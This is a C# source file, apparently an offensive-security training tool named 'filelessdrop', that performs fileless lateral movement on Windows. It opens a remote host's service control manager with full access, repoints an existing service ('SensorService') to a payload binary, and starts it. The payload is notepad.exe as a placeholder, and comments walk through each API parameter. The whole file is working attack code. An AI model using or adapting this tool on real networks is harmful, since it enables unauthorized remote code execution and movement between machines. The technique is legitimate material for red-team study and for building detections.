using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace filelessdrop
{
    class Program
    {
        /*
         SC_HANDLE OpenSCManagerW(
            LPCWSTR lpMachineName, ->remote host name
            LPCWSTR lpDatabaseName, -> database for the service control 
            DWORD dwDesiredAccess -> we want SC_MANAGER_ALL_ACCESS (full access) or 0xF003F
        );
        */
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        /*
         * 
         SC_HANDLE OpenServiceW(
            SC_HANDLE hSCManager, -> handle from  OpenSCManager
            LPCWSTR lpServiceName, -> remote service name
            DWORD dwDesiredAccess  -> 0xF01FF for full access
          );
         
         */

 
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);


        /*
   BOOL ChangeServiceConfigA(
      SC_HANDLE hService,
      DWORD dwServiceType, -> we only want to modify service binary, SERVICE_NO_CHANGE by its numerical value, 0xffffffff
      DWORD dwStartType, ->SERVICE_DEMAND_START (0x3).
      DWORD dwErrorControl, -> SERVICE_NO_CHANGE (0) to avoid modifying
      LPCSTR lpBinaryPathName, -> binpath for our new service path, notepad.exe
      LPCSTR lpLoadOrderGroup, ->
      LPDWORD lpdwTagId,
      LPCSTR lpDependencies,
      LPCSTR lpServiceStartName,
      LPCSTR lpPassword,
      LPCSTR lpDisplayName
      );

   */
        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, 
            string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        /*
         The final step is to start the service, which we can do through the StartService API. 
        BOOL StartServiceA(
            SC_HANDLE hService, -> service handle 
            DWORD dwNumServiceArgs,  -> number of arguments
            LPCSTR *lpServiceArgVectors -> array of strings that are passed as arguments to service
        );
         */

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        static void Main(string[] args)
        {
            String target = "remote host name";

            //authenticate to the remote host
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
            string ServiceName = "SensorService";
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
            string payload = "notepad.exe";
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);

            bResult = StartService(schService, 0, null);

        }
    }
}
